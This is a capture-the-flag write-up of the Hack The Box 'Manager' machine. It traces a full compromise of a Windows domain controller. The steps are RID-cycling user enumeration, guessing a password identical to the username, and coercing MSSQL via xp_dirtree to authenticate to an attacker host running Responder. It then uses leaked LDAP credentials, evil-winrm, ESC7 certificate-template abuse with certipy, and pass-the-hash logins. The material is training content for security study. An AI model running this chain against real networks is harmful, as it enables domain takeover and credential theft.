---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Manager

## Enumeration

### Nmap

Be careful, scan all ports in windows machine. As for example WinRM is a big number

```shell
$ nmap -sV -sC -p- -v 10.129.160.68
Host is up (0.040s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-26 23:38:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
|_ssl-date: 2023-10-26T23:39:33+00:00; +6h59m58s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-26T23:39:34+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.160.68:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2023-10-26T23:39:33+00:00; +6h59m58s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.160.68:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-10-26T23:26:53
| Not valid after:  2053-10-26T23:26:53
| MD5:   3d06:b60a:0093:813a:062b:09f2:02c0:fd67
|_SHA-1: 3f36:af9b:3ae3:2b77:6163:2c07:2629:b0a9:6cfe:aad0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-10-26T23:39:33+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
|_ssl-date: 2023-10-26T23:39:34+00:00; +6h59m58s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49680/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
65181/tcp open  msrpc         Microsoft Windows RPC
65231/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-10-26T23:38:53
|_  start_date: N/A
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s

NSE: Script Post-scanning.
Initiating NSE at 16:39
Completed NSE at 16:39, 0.00s elapsed
Initiating NSE at 16:39
Completed NSE at 16:39, 0.00s elapsed
Initiating NSE at 16:39
Completed NSE at 16:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.29 seconds
```

## Web (TCP 80)

There is a contact form. But it does nothing.

### Dir search

Feroxbuser did not find anything interesing either. `feroxbuster -u http://10.10.11.236 --insecure --filter-status 404`

### ffuf (subdomains)

Nothing

## SMB (445)

```
smbmap -H 10.129.160.68 -u anonymous
[+] Guest session       IP: 10.129.160.68:445   Name: manager.htb                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
```

It looks like we can read IPC$ share (inter-process communication share). Let's call it recursively and see what there is.

```
─$ smbmap -H 10.129.160.68 -u anonymous -R 
[+] Guest session       IP: 10.129.160.68:445   Name: manager.htb                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    InitShutdown
        fr--r--r--                5 Mon Jan  1 00:00:00 1601    lsass
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    ntsvcs
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    scerpc
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-388-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    epmapper
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-1e4-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    LSM_API_service
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    eventlog
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-464-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    atsvc
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-668-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-284-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-284-1
        fr--r--r--                4 Mon Jan  1 00:00:00 1601    wkssvc
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    RpcProxy\49679
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    978383f80cc1a914
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    RpcProxy\593
        fr--r--r--                4 Mon Jan  1 00:00:00 1601    srvsvc
        fr--r--r--                4 Mon Jan  1 00:00:00 1601    winreg
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    netdfs
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    vgauth-service
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    SQLLocal\SQLEXPRESS
        fr--r--r--                2 Mon Jan  1 00:00:00 1601    MSSQL$SQLEXPRESS\sql\query
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    W32TIME_ALT
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    tapsrv
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-270-0
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    ROUTER
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-940-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-554-0
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    iisipm0baee314-a5e4-41f5-9484-bc36dd3a5de5
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    iislogpipe91e19354-fc30-42a3-8882-f53146c9b340
        fr--r--r--                3 Mon Jan  1 00:00:00 1601    cert
        fr--r--r--                1 Mon Jan  1 00:00:00 1601    Winsock2\CatalogChangeListener-bb0-0
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
```

By some googling, we spoted a possiblity to enumerate users with RID cycling attack. It requires read on IPC$. Essentially buruteforcing users by their SID, due to its structure. See: https://www.trustedsec.com/blog/new-tool-release-rpc_enum-rid-cycling-attack

```
└─$ netexec smb manager.htb --rid-brute -u a -p ''        
SMB         10.129.160.68   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.160.68   445    DC01             [+] manager.htb\a: 
SMB         10.129.160.68   445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.160.68   445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.129.160.68   445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.129.160.68   445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.129.160.68   445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.129.160.68   445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.129.160.68   445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.129.160.68   445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.129.160.68   445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.129.160.68   445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.129.160.68   445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.129.160.68   445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.129.160.68   445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.160.68   445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.160.68   445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.160.68   445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.129.160.68   445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.129.160.68   445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.160.68   445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.160.68   445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.160.68   445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.160.68   445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.129.160.68   445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.129.160.68   445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.160.68   445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.129.160.68   445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.129.160.68   445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.160.68   445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.160.68   445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.160.68   445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.160.68   445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.160.68   445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

So we got list of domain users.

## DNS (TCP 53)

```
└─$ dig any manager.htb @10.10.11.236

; <<>> DiG 9.18.16-1-Debian <<>> any manager.htb @10.10.11.236
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42111
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;manager.htb.                   IN      ANY

;; ANSWER SECTION:
manager.htb.            600     IN      A       10.10.11.236
manager.htb.            3600    IN      NS      dc01.manager.htb.
manager.htb.            3600    IN      SOA     dc01.manager.htb. hostmaster.manager.htb. 252 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.manager.htb.       3600    IN      A       10.10.11.236

;; Query time: 32 msec
;; SERVER: 10.10.11.236#53(10.10.11.236) (TCP)
;; WHEN: Thu Oct 26 12:47:35 EDT 2023
;; MSG SIZE  rcvd: 138
```

There are subdomains: manager.htb dc01.manager.htb

## MSSQL (1433)

Seems like authentication is required

## User operator

We tried some easy passwords on the users. First password same as the username **AND IT WORKED FOR operator!**

```
┌──(pentester㉿kali)-[~/htb/machines/manager]
└─$ netexec smb manager.htb -u operator -p operator
SMB         10.129.160.68   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.129.160.68   445    DC01             [+] manager.htb\operator:operator 
```

List shares with operator

```
└─$ crackmapexec smb manager.htb -u operator -p operator --shares  
SMB         manager.htb     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         manager.htb     445    DC01             [+] manager.htb\operator:operator 
SMB         manager.htb     445    DC01             [+] Enumerated shares
SMB         manager.htb     445    DC01             Share           Permissions     Remark
SMB         manager.htb     445    DC01             -----           -----------     ------
SMB         manager.htb     445    DC01             ADMIN$                          Remote Admin
SMB         manager.htb     445    DC01             C$                              Default share
SMB         manager.htb     445    DC01             IPC$            READ            Remote IPC
SMB         manager.htb     445    DC01             NETLOGON        READ            Logon server share 
SMB         manager.htb     445    DC01             SYSVOL          READ            Logon server share 
```

But nothing much to it

### MSSQL

But operator can authenticate to MSSQL

```
└─$ impacket-mssqlclient operator:operator@manager.htb -windows-auth 
```

There is nothing there.

So we tried some procedures.

#### Steal netntlm-v2

Using  `xp_dirtree` to authenticate to us [link to hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack)

```
# On your machine
sudo responder -I tun0
# On MSSQL server
xp_dirtree '\\10.10.14.158\any\thing'
```

Which responds with

```
[+] Listening for events...                                                                                                                                  

[SMB] NTLMv2-SSP Client   : 10.129.160.68
[SMB] NTLMv2-SSP Username : MANAGER\DC01$
[SMB] NTLMv2-SSP Hash     : DC01$::MANAGER:3ee2869c04652e53:F6FB09F43ED344BC0AF9E77E5AC3CC6F:010100000000000080A5454E3F08DA010A5876B766CCE767000000000200080059004F004F00500001001E00570049004E002D0035005A00390043005700380057004D0037004E00340004003400570049004E002D0035005A00390043005700380057004D0037004E0034002E0059004F004F0050002E004C004F00430041004C000300140059004F004F0050002E004C004F00430041004C000500140059004F004F0050002E004C004F00430041004C000700080080A5454E3F08DA0106000400020000000800300030000000000000000000000000300000798F92BA5A5110DBDFAF21EC5FD2BC7EACC4ADCFF9C65DE89C1C025BE3A3DCB90A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100310035000000000000000000                                                            
```

But that is not just hash. It is the challange, so I can't crack it or pass it.

#### Show files of webserver

Using  `xp_dirtree` to browse filesystem. But you cannot read the files. Let's take a look at the web server `xp_dirtree 'C:\inetpub\wwwroot\',1,1`

```
about.html                                                                                                                                                                                                                                                                  1             1   

contact.html                                                                                                                                                                                                                                                                1             1   

css                                                                                                                                                                                                                                                                         1             0   

images                                                                                                                                                                                                                                                                      1             0   

index.html                                                                                                                                                                                                                                                                  1             1   

js                                                                                                                                                                                                                                                                          1             0   

service.html                                                                                                                                                                                                                                                                1             1   

web.config                                                                                                                                                                                                                                                                  1             1   

website-backup-27-07-23-old.zip  
```

There is a backup. Let's download it via HTTP

.old-conf.xml:

```
<ldap-conf>
<server>
<host>dc01.manager.htb</host>
<open-port enabled="true">389</open-port>
<secure-port enabled="false">0</secure-port>
<search-base>dc=manager,dc=htb</search-base>
<server-type>microsoft</server-type>
<access-user>
<user>raven@manager.htb</user>
<password>R4v3nBe5tD3veloP3r!123</password>
</access-user>
<uid-attribute>cn</uid-attribute>
</server>
<search type="full">
<dir-list>
<dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
</dir-list>
</search>
</ldap-conf>
```

There is a password

You can log in with it.

```
evil-winrm -i 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
```

And that's the user.

## -> Root

Runing `linWinPwn`, it suggests that there are vulnerable templates then go step by step in the hacktricks article https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#attack-2

Also, `certipy` can spot it.

```
certipy find -username raven@dc01.manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

It points o ESC7 vulnerability.

It is missconfigiration of access rights, ManageCA and the ManageCertificates, which translate to the "CA administrator" and "Certificate Manager".

### Exploit ESC7

Get the key

```
# You might need to call it before every command, as it seems to be periodically cleared
certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

certipy ca -ca 'manager-DC01-CA' -enable-template 'SubCA' -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

# This will say that it failed.
certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb

# Issue request is the request ID from previous command
certipy ca -ca manager-DC01-CA -issue-request 61 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'

certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 61
```

Abuse the key to get the hash

```
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'manager.htb' -dc-ip 10.10.11.236
```

Now you will encounter a problem with clock skew.

```
rdate -n <IP>
```

Execute it again and you will get the hash. Impacket:

```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

Winrm:

```
evil-winrm -i 10.10.11.236 -u 'administrator' -H 'ae5064c2f62317332c88629e025924ef'
```

Now just grab a flag.